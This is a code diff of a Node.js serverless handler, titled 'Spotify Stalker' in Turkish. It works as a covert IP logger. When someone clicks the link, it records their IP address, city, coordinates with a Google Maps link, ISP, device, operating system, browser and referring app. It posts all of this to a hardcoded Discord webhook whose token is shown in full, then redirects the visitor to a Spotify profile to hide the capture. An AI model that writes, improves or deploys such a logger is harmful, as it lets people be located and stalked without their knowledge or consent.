@@ -1,5 +1,4 @@
 const https = require('https');
-const UAParser = require('ua-parser-js');
 
 const WEBHOOK = 'https://discord.com/api/webhooks/1513283799583162458/SeJddnVhH8sK1REjZwc9yhTaon0cG7kY85Q8VFhqhfDo2BQstD3-lncKGKoIIuXcYDmO';
 const REDIRECT = 'https://open.spotify.com/user/zx9oehv0zw9qx96qowlby0ktl?si=22be720da7b1485a';
@@ -14,47 +13,6 @@ function fetchJSON(url) {
   });
 }
 
-function detectApp(ua, referrer) {
-  const checks = [
-    [/WhatsApp/i, 'WhatsApp'],
-    [/Instagram/i, 'Instagram'],
-    [/FBAN|FBAV|Facebook/i, 'Facebook'],
-    [/Messenger/i, 'Facebook Messenger'],
-    [/Telegram/i, 'Telegram'],
-    [/Twitter|Tweetbot/i, 'Twitter/X'],
-    [/Discord/i, 'Discord'],
-    [/LinkedIn/i, 'LinkedIn'],
-    [/Snapchat/i, 'Snapchat'],
-    [/TikTok/i, 'TikTok'],
-    [/Pinterest/i, 'Pinterest'],
-    [/Reddit/i, 'Reddit'],
-    [/Signal/i, 'Signal'],
-    [/Skype/i, 'Skype'],
-    [/Viber/i, 'Viber'],
-    [/LINE/i, 'LINE'],
-    [/MicroMessenger/i, 'WeChat'],
-    [/Kik/i, 'Kik'],
-    [/GroupMe/i, 'GroupMe'],
-    [/okhttp/i, 'Android Uygulama'],
-    [/^https?:\/\/(?:www\.)?(?:l\.)?instagram\.com/i, 'Instagram'],
-    [/^https?:\/\/(?:www\.)?(?:m\.)?facebook\.com/i, 'Facebook'],
-    [/^https?:\/\/(?:www\.)?twitter\.com/i, 'Twitter/X'],
-    [/^https?:\/\/(?:www\.)?t\.co/i, 'Twitter/X'],
-    [/^https?:\/\/(?:www\.)?reddit\.com/i, 'Reddit'],
-    [/^https?:\/\/(?:www\.)?linkedin\.com/i, 'LinkedIn'],
-    [/^https?:\/\/(?:www\.)?tiktok\.com/i, 'TikTok'],
-    [/^https?:\/\/(?:www\.)?pinterest\.com/i, 'Pinterest'],
-    [/^https?:\/\/(?:www\.)?snapchat\.com/i, 'Snapchat'],
-    [/^https?:\/\/(?:www\.)?wa\.me|api\.whatsapp/i, 'WhatsApp'],
-    [/^https?:\/\/l\.facebook\.com/i, 'Facebook'],
-    [/^https?:\/\/(?:www\.)?youtube\.com/i, 'YouTube'],
-  ];
-  for (const [pattern, name] of checks) {
-    if (pattern.test(ua) || pattern.test(referrer)) return name;
-  }
-  return referrer || 'Doğrudan / Bilinmiyor';
-}
-
 function postJSON(url, payload) {
   return new Promise((resolve, reject) => {
     const data = JSON.stringify(payload);
@@ -67,36 +25,132 @@ function postJSON(url, payload) {
   });
 }
 
+function codeToFlag(code) {
+  if (!code || code.length !== 2) return '';
+  return String.fromCodePoint(0x1F1E6 + code.charCodeAt(0) - 65, 0x1F1E6 + code.charCodeAt(1) - 65);
+}
+
+function parseUA(ua) {
+  let os = 'Bilinmiyor';
+  let browser = 'Bilinmiyor';
+  let device = '-';
+  let app = 'Doğrudan / Bilinmiyor';
+
+  if (/WhatsApp/i.test(ua)) app = 'WhatsApp';
+  else if (/Instagram/i.test(ua)) app = 'Instagram';
+  else if (/FBAN|FBAV|Facebook/i.test(ua)) app = 'Facebook';
+  else if (/Messenger/i.test(ua)) app = 'Facebook Messenger';
+  else if (/Telegram/i.test(ua)) app = 'Telegram';
+  else if (/Twitter|Tweetbot/i.test(ua)) app = 'Twitter/X';
+  else if (/Discord/i.test(ua)) app = 'Discord';
+  else if (/LinkedIn/i.test(ua)) app = 'LinkedIn';
+  else if (/Snapchat/i.test(ua)) app = 'Snapchat';
+  else if (/TikTok/i.test(ua)) app = 'TikTok';
+  else if (/Reddit/i.test(ua)) app = 'Reddit';
+  else if (/okhttp/i.test(ua)) app = 'Android Uygulama';
+
+  if (/iPhone/i.test(ua)) { device = 'iPhone'; os = 'iOS'; }
+  else if (/iPad/i.test(ua)) { device = 'iPad'; os = 'iOS'; }
+  else if (/Android/i.test(ua)) { device = /Mobile/i.test(ua) ? 'Android Telefon' : 'Android Tablet'; }
+
+  if (/Windows NT 10/i.test(ua)) os = 'Windows 10';
+  else if (/Windows NT 11/i.test(ua)) os = 'Windows 11';
+  else if (/Windows NT 6\.3/i.test(ua)) os = 'Windows 8.1';
+  else if (/Windows NT 6\.2/i.test(ua)) os = 'Windows 8';
+  else if (/Windows NT 6\.1/i.test(ua)) os = 'Windows 7';
+  else if (/Mac OS X (\d+[._]\d+)/.test(ua)) os = 'macOS ' + RegExp.$1.replace('_', '.');
+  else if (/Linux/i.test(ua) && !/Android/i.test(ua)) os = 'Linux';
+
+  if (/Chrome/i.test(ua) && !/Edg|OPR/i.test(ua)) {
+    let m = ua.match(/Chrome\/([\d.]+)/);
+    browser = 'Chrome ' + (m ? m[1] : '');
+  } else if (/Firefox/i.test(ua)) {
+    let m = ua.match(/Firefox\/([\d.]+)/);
+    browser = 'Firefox ' + (m ? m[1] : '');
+  } else if (/Edg/i.test(ua)) {
+    let m = ua.match(/Edg\/([\d.]+)/);
+    browser = 'Edge ' + (m ? m[1] : '');
+  } else if (/OPR/i.test(ua)) {
+    let m = ua.match(/OPR\/([\d.]+)/);
+    browser = 'Opera ' + (m ? m[1] : '');
+  } else if (/Safari/i.test(ua)) {
+    let m = ua.match(/Version\/([\d.]+)/);
+    browser = 'Safari ' + (m ? m[1] : '');
+  }
+
+  return { os, browser, device, app };
+}
+
+function fmtDate(d) {
+  const day = String(d.getDate()).padStart(2, '0');
+  const month = String(d.getMonth() + 1).padStart(2, '0');
+  const year = d.getFullYear();
+  const h = String(d.getHours()).padStart(2, '0');
+  const m = String(d.getMinutes()).padStart(2, '0');
+  return day + '.' + month + '.' + year + ' ' + h + ':' + m;
+}
+
+function relDate(d) {
+  const now = new Date();
+  const diff = now - d;
+  const h = String(d.getHours()).padStart(2, '0');
+  const m = String(d.getMinutes()).padStart(2, '0');
+  if (diff < 86400000 && d.getDate() === now.getDate()) return 'bugün ' + h + ':' + m;
+  const yesterday = new Date(now);
+  yesterday.setDate(yesterday.getDate() - 1);
+  if (d.getDate() === yesterday.getDate() && d.getMonth() === yesterday.getMonth() && d.getFullYear() === yesterday.getFullYear()) return 'dün ' + h + ':' + m;
+  return fmtDate(d);
+}
+
 module.exports = async (req, res) => {
   try {
     const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress;
     const uaStr = req.headers['user-agent'] || '';
-    const referrer = req.headers['referer'] || 'Doğrudan';
+    const referrer = req.headers['referer'] || '';
 
-    const parser = new UAParser(uaStr);
-    const browser = parser.getBrowser();
-    const os = parser.getOS();
-    const device = parser.getDevice();
+    const { os, browser, device, app } = parseUA(uaStr);
+    const source = app !== 'Doğrudan / Bilinmiyor' ? app : (referrer || 'Doğrudan / Bilinmiyor');
 
     let geo = {};
-    try { geo = await fetchJSON('http://ip-api.com/json/' + ip + '?fields=city,country,isp,org,as,query'); } catch(e) {}
+    try { geo = await fetchJSON('http://ip-api.com/json/' + ip + '?fields=city,country,countryCode,isp,org,lat,lon'); } catch(e) {}
 
+    const flag = codeToFlag(geo.countryCode);
+    const konum = geo.city ? geo.city + ', ' + geo.country : 'Bilinmiyor';
+    const mapsLink = geo.lat ? 'https://www.google.com/maps?q=' + geo.lat + ',' + geo.lon : '';
+
+    const now = new Date();
     const lines = [
-      '**SPOTIFY STALKERi !!!**',
+      '**Spotify Stalkeri !!!**',
       '',
-      '**IP :** ' + ip,
-      '**Konum :** ' + (geo.city ? geo.city + ', ' + geo.country : 'Bilinmiyor'),
-      '**Linke Tıklanan Uygulama :** ' + detectApp(uaStr, referrer),
-      '**Cihaz :** ' + (device.vendor || device.model || 'Bilinmiyor') + (device.model ? ' ' + device.model : ''),
-      '**İşletim Sistemi :** ' + (os.name || 'Bilinmiyor') + (os.version ? ' ' + os.version : ''),
-      '**Tarayıcı :** ' + (browser.name || 'Bilinmiyor') + (browser.version ? ' ' + browser.version : ''),
-      '**ISS :** ' + (geo.isp || geo.org || 'Bilinmiyor'),
-      '**Tarih :** ' + new Date().toLocaleString('tr-TR'),
+      ':round_pushpin: **Konum**',
+      flag + ' ' + konum,
+      mapsLink ? '[Haritada göster](' + mapsLink + ')' : '',
       '',
-      '                                                        made by wer1x'
+      ':id: **IP**',
+      ip,
+      '',
+      ':mobile_phone: **Cihaz**',
+      device,
+      '',
+      ':desktop: **İşletim Sistemi**',
+      os,
+      '',
+      ':globe_with_meridians: **Tarayıcı**',
+      browser,
+      '',
+      ':satellite: **ISS**',
+      geo.isp || geo.org || 'Bilinmiyor',
+      '',
+      ':link: **Yönlendiren**',
+      source,
+      '',
+      ':alarm_clock: **Tarih**',
+      fmtDate(now),
+      '',
+      'Spotify Stalker · 37xw • ' + relDate(now)
     ];
 
-    await postJSON(WEBHOOK, { content: lines.join('\n') });
+    await postJSON(WEBHOOK, { content: lines.filter(l => l !== '').join('\n') });
   } catch(e) {}
 
   res.writeHead(302, { Location: REDIRECT });
